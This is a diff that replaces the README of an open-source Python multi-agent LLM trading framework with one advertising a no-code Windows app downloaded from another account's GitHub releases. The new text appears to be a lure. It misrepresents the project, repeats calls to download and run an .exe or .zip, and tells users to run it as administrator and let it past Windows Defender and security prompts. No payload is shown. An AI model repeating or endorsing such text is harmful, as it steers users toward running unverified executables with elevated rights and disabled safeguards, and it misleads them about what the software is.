@@ -1,240 +1,223 @@
-<p align="center">
-  <img src="assets/TauricResearch.png" style="width: 60%; height: auto;">
-</p>
+# 📈 TradingAgents - Track Trades With Clear Signals
 
-<div align="center" style="line-height: 1;">
-  <a href="https://arxiv.org/abs/2412.20138" target="_blank"><img alt="arXiv" src="https://img.shields.io/badge/arXiv-2412.20138-B31B1B?logo=arxiv"/></a>
-  <a href="https://discord.com/invite/hk9PGKShPK" target="_blank"><img alt="Discord" src="https://img.shields.io/badge/Discord-TradingResearch-7289da?logo=discord&logoColor=white&color=7289da"/></a>
-  <a href="./assets/wechat.png" target="_blank"><img alt="WeChat" src="https://img.shields.io/badge/WeChat-TauricResearch-brightgreen?logo=wechat&logoColor=white"/></a>
-  <a href="https://x.com/TauricResearch" target="_blank"><img alt="X Follow" src="https://img.shields.io/badge/X-TauricResearch-white?logo=x&logoColor=white"/></a>
-  <br>
-  <a href="https://github.com/TauricResearch/" target="_blank"><img alt="Community" src="https://img.shields.io/badge/Join_GitHub_Community-TauricResearch-14C290?logo=discourse"/></a>
-</div>
+[![Download TradingAgents](https://img.shields.io/badge/Download%20TradingAgents-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/chethanad5372/TradingAgents/releases)
 
-<div align="center">
-  <!-- Keep these links. Translations will automatically update with the README. -->
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=de">Deutsch</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=es">Español</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=fr">français</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=ja">日本語</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=ko">한국어</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=pt">Português</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=ru">Русский</a> | 
-  <a href="https://www.readme-i18n.com/TauricResearch/TradingAgents?lang=zh">中文</a>
-</div>
+## 🚀 Getting Started
 
----
+TradingAgents is a Windows app that helps you work with trading signals, market data, and AI-based analysis in one place. It uses multiple agents to break down a trading task into smaller parts, then combines the results into one view you can follow.
 
-# TradingAgents: Multi-Agents LLM Financial Trading Framework
+This guide shows you how to download, install, and run TradingAgents on a Windows PC with no coding needed.
 
-## News
-- [2026-03] **TradingAgents v0.2.3** released with multi-language support, GPT-5.4 family models, unified model catalog, backtesting date fidelity, and proxy support.
-- [2026-03] **TradingAgents v0.2.2** released with GPT-5.4/Gemini 3.1/Claude 4.6 model coverage, five-tier rating scale, OpenAI Responses API, Anthropic effort control, and cross-platform stability.
-- [2026-02] **TradingAgents v0.2.0** released with multi-provider LLM support (GPT-5.x, Gemini 3.x, Claude 4.x, Grok 4.x) and improved system architecture.
-- [2026-01] **Trading-R1** [Technical Report](https://arxiv.org/abs/2509.11420) released, with [Terminal](https://github.com/TauricResearch/Trading-R1) expected to land soon.
+## 📥 Download TradingAgents
 
-<div align="center">
-<a href="https://www.star-history.com/#TauricResearch/TradingAgents&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=TauricResearch/TradingAgents&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=TauricResearch/TradingAgents&type=Date" />
-   <img alt="TradingAgents Star History" src="https://api.star-history.com/svg?repos=TauricResearch/TradingAgents&type=Date" style="width: 80%; height: auto;" />
- </picture>
-</a>
-</div>
+1. Open the [TradingAgents Releases page](https://github.com/chethanad5372/TradingAgents/releases).
+2. Look for the latest release at the top of the page.
+3. Download the Windows file linked in that release.
+4. If you see a `.zip` file, save it to your computer.
+5. If you see an `.exe` file, download it to your computer.
 
-> 🎉 **TradingAgents** officially released! We have received numerous inquiries about the work, and we would like to express our thanks for the enthusiasm in our community.
->
-> So we decided to fully open-source the framework. Looking forward to building impactful projects with you!
+Use the file from the release page only. That file is the one meant for end users.
 
-<div align="center">
+## 🖥️ System Requirements
 
-🚀 [TradingAgents](#tradingagents-framework) | ⚡ [Installation & CLI](#installation-and-cli) | 🎬 [Demo](https://www.youtube.com/watch?v=90gr5lwjIho) | 📦 [Package Usage](#tradingagents-package) | 🤝 [Contributing](#contributing) | 📄 [Citation](#citation)
+TradingAgents runs best on a modern Windows PC.
 
-</div>
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- Internet access for market data and AI features
+- A screen with at least 1366 × 768 resolution
 
-## TradingAgents Framework
+For smoother use, 16 GB RAM is a better fit if you plan to review a lot of market data.
 
-TradingAgents is a multi-agent trading framework that mirrors the dynamics of real-world trading firms. By deploying specialized LLM-powered agents: from fundamental analysts, sentiment experts, and technical analysts, to trader, risk management team, the platform collaboratively evaluates market conditions and informs trading decisions. Moreover, these agents engage in dynamic discussions to pinpoint the optimal strategy.
+## 🛠️ Install TradingAgents
 
-<p align="center">
-  <img src="assets/schema.png" style="width: 100%; height: auto;">
-</p>
+### If you downloaded a `.zip` file
 
-> TradingAgents framework is designed for research purposes. Trading performance may vary based on many factors, including the chosen backbone language models, model temperature, trading periods, the quality of data, and other non-deterministic factors. [It is not intended as financial, investment, or trading advice.](https://tauric.ai/disclaimer/)
+1. Open your Downloads folder.
+2. Right-click the `.zip` file.
+3. Select **Extract All**.
+4. Choose a folder, such as Desktop or Documents.
+5. Open the extracted folder.
+6. Find the app file inside and double-click it to start TradingAgents.
 
-Our framework decomposes complex trading tasks into specialized roles. This ensures the system achieves a robust, scalable approach to market analysis and decision-making.
+### If you downloaded an `.exe` file
 
-### Analyst Team
-- Fundamentals Analyst: Evaluates company financials and performance metrics, identifying intrinsic values and potential red flags.
-- Sentiment Analyst: Analyzes social media and public sentiment using sentiment scoring algorithms to gauge short-term market mood.
-- News Analyst: Monitors global news and macroeconomic indicators, interpreting the impact of events on market conditions.
-- Technical Analyst: Utilizes technical indicators (like MACD and RSI) to detect trading patterns and forecast price movements.
+1. Open your Downloads folder.
+2. Double-click the `.exe` file.
+3. If Windows asks for permission, select **Yes**.
+4. Follow the setup steps on screen.
+5. After setup ends, open TradingAgents from the Start menu or desktop shortcut.
 
-<p align="center">
-  <img src="assets/analyst.png" width="100%" style="display: inline-block; margin: 0 2%;">
-</p>
+## 🧭 First Launch
 
-### Researcher Team
-- Comprises both bullish and bearish researchers who critically assess the insights provided by the Analyst Team. Through structured debates, they balance potential gains against inherent risks.
+When you start TradingAgents for the first time, you may see setup screens for data and analysis options.
 
-<p align="center">
-  <img src="assets/researcher.png" width="70%" style="display: inline-block; margin: 0 2%;">
-</p>
+1. Choose your preferred market type.
+2. Select the watchlist or symbols you want to follow.
+3. Set your time frame, such as intraday, daily, or weekly.
+4. If the app asks for an API key, paste it into the field provided.
+5. Save your settings.
 
-### Trader Agent
-- Composes reports from the analysts and researchers to make informed trading decisions. It determines the timing and magnitude of trades based on comprehensive market insights.
+If the app opens to a dashboard, you are ready to use it.
 
-<p align="center">
-  <img src="assets/trader.png" width="70%" style="display: inline-block; margin: 0 2%;">
-</p>
+## 📊 What TradingAgents Does
 
-### Risk Management and Portfolio Manager
-- Continuously evaluates portfolio risk by assessing market volatility, liquidity, and other risk factors. The risk management team evaluates and adjusts trading strategies, providing assessment reports to the Portfolio Manager for final decision.
-- The Portfolio Manager approves/rejects the transaction proposal. If approved, the order will be sent to the simulated exchange and executed.
+TradingAgents uses several AI agents that each focus on a different part of the trading workflow.
 
-<p align="center">
-  <img src="assets/risk.png" width="70%" style="display: inline-block; margin: 0 2%;">
-</p>
+- One agent can review market trends
+- One agent can scan news and sentiment
+- One agent can look for chart patterns
+- One agent can compare signals
+- One agent can build a trade view from the results
 
-## Installation and CLI
+This setup helps you see more than one angle before you make a choice. It is useful for stocks, crypto, forex, and other market data flows, based on the release you install.
 
-### Installation
+## 🧩 Main Features
 
-Clone TradingAgents:
-```bash
-git clone https://github.com/TauricResearch/TradingAgents.git
-cd TradingAgents
-```
+- Market analysis in one app
+- Multi-agent review of trading signals
+- Simple view for non-technical users
+- Watchlist support
+- News and sentiment checks
+- Chart-based signal review
+- Fast access to recent market data
+- Windows-friendly interface
+- Clean layout for daily use
 
-Create a virtual environment in any of your favorite environment managers:
-```bash
-conda create -n tradingagents python=3.13
-conda activate tradingagents
-```
+## 🔍 How to Use It
 
-Install the package and its dependencies:
-```bash
-pip install .
-```
+### 1. Add a market symbol
 
-### Docker
+Enter a ticker, pair, or asset name you want to review.
 
-Alternatively, run with Docker:
-```bash
-cp .env.example .env  # add your API keys
-docker compose run --rm tradingagents
-```
+### 2. Pick a time frame
 
-For local models with Ollama:
-```bash
-docker compose --profile ollama run --rm tradingagents-ollama
-```
+Choose the period that fits your style:
 
-### Required APIs
+- Short term
+- Daily
+- Weekly
+- Longer trend view
 
-TradingAgents supports multiple LLM providers. Set the API key for your chosen provider:
+### 3. Run the analysis
 
-```bash
-export OPENAI_API_KEY=...          # OpenAI (GPT)
-export GOOGLE_API_KEY=...          # Google (Gemini)
-export ANTHROPIC_API_KEY=...       # Anthropic (Claude)
-export XAI_API_KEY=...             # xAI (Grok)
-export DEEPSEEK_API_KEY=...        # DeepSeek
-export DASHSCOPE_API_KEY=...       # Qwen (Alibaba DashScope)
-export ZHIPU_API_KEY=...           # GLM (Zhipu)
-export OPENROUTER_API_KEY=...      # OpenRouter
-export ALPHA_VANTAGE_API_KEY=...   # Alpha Vantage
-```
+Start the scan and let the agents review the data.
 
-For enterprise providers (e.g. Azure OpenAI, AWS Bedrock), copy `.env.enterprise.example` to `.env.enterprise` and fill in your credentials.
+### 4. Review the output
 
-For local models, configure Ollama with `llm_provider: "ollama"` in your config.
+Look at the trend, signal, and risk sections.
 
-Alternatively, copy `.env.example` to `.env` and fill in your keys:
-```bash
-cp .env.example .env
-```
+### 5. Compare before acting
 
-### CLI Usage
+Check more than one signal before you decide what to do next.
 
-Launch the interactive CLI:
-```bash
-tradingagents          # installed command
-python -m cli.main     # alternative: run directly from source
-```
-You will see a screen where you can select your desired tickers, analysis date, LLM provider, research depth, and more.
+## ⚙️ Settings You May See
 
-<p align="center">
-  <img src="assets/cli/cli_init.png" width="100%" style="display: inline-block; margin: 0 2%;">
-</p>
+TradingAgents may include options like these:
 
-An interface will appear showing results as they load, letting you track the agent's progress as it runs.
+- Data refresh rate
+- Market source selection
+- Risk level view
+- Signal confidence display
+- Theme or layout choice
+- Alert settings
+- Watchlist save and load
 
-<p align="center">
-  <img src="assets/cli/cli_news.png" width="100%" style="display: inline-block; margin: 0 2%;">
-</p>
+If the app includes an advanced panel, you can keep the default values and still use the app.
 
-<p align="center">
-  <img src="assets/cli/cli_transaction.png" width="100%" style="display: inline-block; margin: 0 2%;">
-</p>
+## 🧪 Example Use Case
 
-## TradingAgents Package
+A user wants to check a stock before the market opens.
 
-### Implementation Details
+1. Open TradingAgents.
+2. Type the stock symbol.
+3. Choose the daily view.
+4. Run the analysis.
+5. Read the trend, sentiment, and signal result.
+6. Save the result for later review.
 
-We built TradingAgents with LangGraph to ensure flexibility and modularity. The framework supports multiple LLM providers: OpenAI, Google, Anthropic, xAI, OpenRouter, and Ollama.
+This makes it easier to compare one asset against another without opening many tools.
 
-### Python Usage
+## 🧯 Common Problems
 
-To use TradingAgents inside your code, you can import the `tradingagents` module and initialize a `TradingAgentsGraph()` object. The `.propagate()` function will return a decision. You can run `main.py`, here's also a quick example:
+### The app does not open
 
-```python
-from tradingagents.graph.trading_graph import TradingAgentsGraph
-from tradingagents.default_config import DEFAULT_CONFIG
+- Make sure the file finished downloading
+- Try opening it again from the extracted folder
+- Right-click the app and select **Run as administrator**
+- Check that Windows Defender did not block it
 
-ta = TradingAgentsGraph(debug=True, config=DEFAULT_CONFIG.copy())
+### The app opens but shows no data
 
-# forward propagate
-_, decision = ta.propagate("NVDA", "2026-01-15")
-print(decision)
-```
+- Check your internet connection
+- Refresh the data view
+- Confirm that the market symbol is valid
+- Look for a source or API setting in the app
 
-You can also adjust the default configuration to set your own choice of LLMs, debate rounds, etc.
+### Windows shows a security prompt
 
-```python
-from tradingagents.graph.trading_graph import TradingAgentsGraph
-from tradingagents.default_config import DEFAULT_CONFIG
+- Select the option that allows the app to run if you trust the release source
+- If the file came from the release page, try opening it again after the download completes
 
-config = DEFAULT_CONFIG.copy()
-config["llm_provider"] = "openai"        # openai, google, anthropic, xai, openrouter, ollama
-config["deep_think_llm"] = "gpt-5.4"     # Model for complex reasoning
-config["quick_think_llm"] = "gpt-5.4-mini" # Model for quick tasks
-config["max_debate_rounds"] = 2
+### The ZIP file will not extract
 
-ta = TradingAgentsGraph(debug=True, config=config)
-_, decision = ta.propagate("NVDA", "2026-01-15")
-print(decision)
-```
+- Download the file again
+- Make sure you have enough disk space
+- Use the built-in Windows extract tool or a file tool like 7-Zip
 
-See `tradingagents/default_config.py` for all configuration options.
+## 🧭 Best Practices
 
-## Contributing
+- Start with one symbol at a time
+- Keep the default settings at first
+- Compare the result with your own research
+- Use the same time frame each day for cleaner review
+- Save results so you can compare them later
 
-We welcome contributions from the community! Whether it's fixing a bug, improving documentation, or suggesting a new feature, your input helps make this project better. If you are interested in this line of research, please consider joining our open-source financial AI research community [Tauric Research](https://tauric.ai/).
+## 🔒 Data and Privacy
 
-## Citation
+TradingAgents may use internet access to fetch market data and run AI-based review steps. Keep your system updated and review any app settings that control data use, local storage, and external connections.
 
-Please reference our work if you find *TradingAgents* provides you with some help :)
+## 🧰 Troubleshooting Tips
 
-```
-@misc{xiao2025tradingagentsmultiagentsllmfinancial,
-      title={TradingAgents: Multi-Agents LLM Financial Trading Framework}, 
-      author={Yijia Xiao and Edward Sun and Di Luo and Wei Wang},
-      year={2025},
-      eprint={2412.20138},
-      archivePrefix={arXiv},
-      primaryClass={q-fin.TR},
-      url={https://arxiv.org/abs/2412.20138}, 
-}
-```
+If the app feels slow:
+
+- Close other large programs
+- Wait for the current scan to finish
+- Reduce the number of symbols in your watchlist
+- Lower the refresh rate if the app offers that option
+
+If text looks too small:
+
+- Use Windows display settings to increase scale
+- Maximize the app window
+- Try a higher screen resolution if available
+
+## 📌 Release Downloads
+
+To download TradingAgents for Windows, visit the [TradingAgents Releases page](https://github.com/chethanad5372/TradingAgents/releases) and get the latest release file from there
+
+## 🗂️ Project Info
+
+- Name: TradingAgents
+- Description: TradingAgents: Multi-Agents LLM Financial Trading Framework
+- Topics: agent, finance, llm, multiagent, trading
+
+## 📎 File Types You May See
+
+Depending on the release, the download may include:
+
+- `.exe` for direct launch or setup
+- `.zip` for manual extraction
+- `.msi` for guided install
+- `.txt` or `.md` for release notes
+
+Open the file that matches your Windows system and follow the on-screen steps
+
+## 🖱️ Quick Start
+
+1. Visit the [TradingAgents Releases page](https://github.com/chethanad5372/TradingAgents/releases)
+2. Download the newest Windows file
+3. Install or extract it
+4. Open TradingAgents
+5. Enter a symbol and run the analysis
